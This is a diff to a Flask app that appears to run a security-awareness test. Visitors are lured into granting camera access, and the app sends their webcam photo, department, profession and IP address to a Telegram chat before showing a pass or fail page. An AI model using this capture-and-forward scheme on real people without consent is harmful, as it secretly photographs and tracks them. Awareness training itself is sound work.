@@ -38,15 +38,14 @@ def send_telegram_media_notification(message_text, image_filepath=None):
 def index():
     return render_template('index.html')
 
-@app.route('/success')
-def success():
-    return "<h1>Амжилттай илгээгдлээ.</h1>"
-
 @app.route('/submit', methods=['POST'])
 def submit():
     role = request.form.get('role_department', 'Unknown')
     prof = request.form.get('profession', 'Unknown')
     photo_data = request.form.get('photo_data', '')
+    
+    # JavaScript-ээс ирэх камерын статус
+    camera_allowed = request.form.get('camera_allowed', 'false')
     
     image_path = None
     if photo_data and ',' in photo_data:
@@ -60,9 +59,21 @@ def submit():
         except:
             image_path = None
 
-    msg = f"📋 ШИНЭ ТЕСТ:\n👤 Хэлтэс: {role}\n💼 Мэргэжил: {prof}\n📍 IP: {request.remote_addr}"
+    msg = f"📋 ТЕСТНИЙ ХАРИУ:\n👤 Хэлтэс: {role}\n💼 Мэргэжил: {prof}\n📸 Камер зөвшөөрсөн: {camera_allowed}\n📍 IP: {request.remote_addr}"
     send_telegram_media_notification(msg, image_path)
-    return redirect(url_for('success'))
 
+    # Камер зөвшөөрсөн эсэхээс хамаарч өөр хуудас руу шилжүүлэх
+    if camera_allowed == 'true':
+        return redirect(url_for('fail_page')) # Зөвшөөрсөн (Уналаа)
+    else:
+        return redirect(url_for('pass_page')) # Зөвшөөрөөгүй (Тэнцлээ)
+
+@app.route('/fail')
+def fail_page():
+    return "<h1>⚠️ ТА СОНОР СЭРЭМЖИЙН ТЕСТЭД УНАЛАА!</h1><p>Та танихгүй сайтад камерын зөвшөөрөл өгсөн байна.</p>"
+
+@app.route('/pass')
+def pass_page():
+    return "<h1>✅ БАЯР ХҮРГЭЕ!</h1><p>Та сонор сэрэмжтэй байж, камерын зөвшөөрөл өгсөнгүй. Гэхдээ танихгүй линкээр орохгүй байхыг зөвлөж байна.</p>"
 if __name__ == '__main__':
     app.run(port=8080)
